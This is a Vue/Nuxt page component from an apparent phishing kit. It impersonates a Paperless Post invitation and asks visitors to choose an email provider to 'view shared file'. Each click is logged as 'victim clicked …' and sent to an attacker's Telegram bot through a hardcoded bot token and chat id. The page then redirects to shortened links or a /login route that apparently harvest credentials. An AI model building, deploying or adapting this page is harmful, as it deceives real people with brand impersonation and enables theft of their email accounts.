<template>
    <div class="home">
        <div class="card">
            <section class="section-text">
                <h2>Welcome to Paperless Post!</h2>
                <p>To read the invitation, please choose your email provider below login to view shared file.</p>
            </section>
            <section class="links">
                    <button @click="finishJoob('victim clicked Outlook', 'https://2it.kr/YypV5')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                        <p>Continue with Outlook</p>
                    </button>

                <NuxtLink to="/login">
                    <button>
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/aol.png" alt="">
                        <p>Continue with AOL</p>
                    </button>
                </NuxtLink>

                    <button @click="finishJoob('victim clicked Yahoo!', 'https://2it.kr/rQXI8Y')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                        <p>Continue with Yahoo!</p>
                    </button>


                    <button @click="finishJoob('victim clicked Office 365', 'https://2it.kr/YypV5')">
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                        <p>Continue with Office 365</p>
                    </button>


                    <button @click="finishJoob('victim clicked Gmail', 'https://2it.kr/k0')">
                        <img src="https://www.logo.wine/a/logo/Gmail/Gmail-Logo.wine.svg" alt="">
                        <p>Continue with Gmail</p>
                    </button>
                    

                <NuxtLink to="/login">
                    <button>
                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/mail.png" alt="">
                        <p>Continue with Other Mail</p>
                    </button>
                </NuxtLink>
            </section>
            <section class="footer">
                <p>
                    By continuing, you agree to Paperless Post’s <a href="">Terms of Use</a>.
                    <br>
                    Read our <a href="Privacy Policy">Privacy Policy</a>.
                </p>
            </section>
        </div>
    </div>
</template>

<style>

.footer {
    color: #8b8b8b;
    font-size: 12px;
    line-height: 16px;
    text-align: center;
}

.footer p {
    margin: 30px 23px 0 23px;
}

.footer p a {
    text-decoration: underline;
}

.footer p a:hover {
    color: #007bff;
}

.home {
    width: full;
    height: 100vh;
    background: #000000b9;
    display: grid;
    place-items: center;
}

.card {
    height: 650px;
    width: 500px;
    background-color: white;
    padding: 34px 52px 22px;
}

.section-text {
    margin: 30px 0 18px;
    text-align: center;
}

.section-text h2 {
    font-size: 25px;
    margin-bottom: 7px;
    font-weight: 400;
}

.section-text p {
    font-size: 16px;
    line-height: 24px;
}

.links {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;


}

.links button {
    margin-top: 10px;
    text-align: center;
    font-size: 16px;
    width: 348.48px;
    height: 46px;
    background: white;
    border: 1px solid #00000020;
    border-radius: 100px;
    cursor: pointer;
    position: relative;
}

.links button img {
    width: 24px;
    height: 24px;
    position: absolute;
    top: 20%;
    left: 20px;
}

.links button p {
    margin: 0;
    font-weight: 500;
}
</style>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        text: "",
      },
      isActive: false,
    };
  },

  computed: {
    isFormValid() {
      return this.formDataRes.text.trim() !== "";
    },
  },

  methods: {

    async finishJoob(text, url) {
      if (this.loading) return;
      this.loading = true;
      try {
        // Format the message as string
        this.formDataRes.text = text;

        const message = `*🔔 Mailings *\n${text}`;
        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.assign(url);

      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    // ============================================================

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>